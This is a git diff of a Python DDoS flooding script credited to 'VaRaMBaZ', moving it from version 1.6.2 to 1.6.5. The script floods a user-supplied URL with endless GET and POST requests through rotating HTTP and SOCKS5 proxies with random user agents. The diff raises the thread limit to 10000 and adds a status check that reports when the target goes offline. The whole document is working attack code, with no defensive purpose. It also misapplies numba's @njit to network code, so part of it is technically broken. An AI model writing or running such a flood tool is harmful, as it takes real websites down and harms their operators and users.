@@ -1,5 +1,3 @@
-import time
-
 import colorama
 import threading
 import random
@@ -7,6 +5,7 @@ import requests
 import cfscrape
 import os
 import pyAesCrypt
+from numba import njit, prange
 
 os.system("clear")
 
@@ -50,6 +49,7 @@ def dospause2(barrier, url):
     dos2(url)
 
 # Аттака
+@njit
 def dos1(target):
     while True:
         useragent = random.choice(headersp)
@@ -59,24 +59,66 @@ def dos1(target):
         header2 = {'user-agent': useragent2}
 
         proxyagenthttp = random.choice(proxy_http)
-        proxieshttp = {
-            'http': f'http://{proxyagenthttp}',
+        proxyagentsocks = random.choice(proxy_socks)
+        proxieshttphttp = {
+            'http': f'http://{proxyagenthttp}'
+        }
+        proxieshttphttps = {
             'https': f'http://{proxyagenthttp}'
         }
-
-        proxyagentsocks = random.choice(proxy_socks)
-        proxiessocks = {
-            'http': f'socks5://{proxyagentsocks}',
+        proxiessockshttp = {
+            'http': f'socks5://{proxyagentsocks}'
+        }
+        proxiessockshttps = {
             'https': f'socks5://{proxyagentsocks}'
         }
+
         try:
-            s.get(target, headers=header, proxies=proxieshttp)
-            s.post(target, headers=header, proxies=proxieshttp)
-            s.get(target, headers=header2, proxies=proxiessocks)
-            s.post(target, headers=header2, proxies=proxiessocks)
+            s.get(target, headers=header, proxies=proxieshttphttp)
         except:
             pass
 
+        try:
+            s.post(target, headers=header2, proxies=proxieshttphttp)
+        except:
+            pass
+
+        try:
+            s.get(target, headers=header, proxies=proxieshttphttps)
+        except:
+            pass
+
+        try:
+            s.post(target, headers=header2, proxies=proxieshttphttps)
+        except:
+            pass
+
+        try:
+            s.get(target, headers=header, proxies=proxiessockshttp)
+        except:
+            pass
+
+        try:
+            s.post(target, headers=header2, proxies=proxiessockshttp)
+        except:
+            pass
+
+        try:
+            s.get(target, headers=header, proxies=proxiessockshttps)
+        except:
+            pass
+
+        try:
+            s.post(target, headers=header2, proxies=proxiessockshttps)
+        except:
+            pass
+        
+        checksite = requests.post(target, proxies=proxieshttphttp)
+        if checksite.status_code >= 500:
+            statustext = "OFFLINE"
+        elif checksite.status_code >= 200:
+            statustext = "ONLINE"
+        print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
 
 def dos2(target):
     while True:
@@ -97,7 +139,7 @@ print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-
 print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
 print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
 print("Creator: VaRaMBaZ")
-print("Version: 1.6.2; Improving the menu and optimizing the attack \n")
+print("Version: 1.6.5; Add check site status \n")
 
 url = input("URL: ")
 if not url.__contains__("http"):
@@ -107,11 +149,11 @@ if not url.__contains__("."):
     exit(colorama.Fore.RED + "Invalid domain")
 
 try:
-    threads = int(input("Threads[max 5000]: "))
+    threads = int(input("Threads[max 10000]: "))
 except ValueError:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
-if threads == 0 or threads > 5000:
+if threads == 0 or threads > 10000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
 bar = threading.Barrier(threads)
@@ -119,12 +161,12 @@ proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
 print(colorama.Fore.YELLOW + "Starting threads...")
-if (proxyuseage == 1):
-    for i in range(0, threads):
+if proxyuseage == 1:
+    for i in prange(0, threads):
         thr = threading.Thread(target=dospause1, args=(bar, url, ))
         thr.start()
 else:
-    for i in range(0, threads):
+    for i in prange(0, threads):
         thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
         thr2.start()
-print(colorama.Fore.GREEN + "All threads are running!")
+print(colorama.Fore.GREEN + "All threads are running! \n")
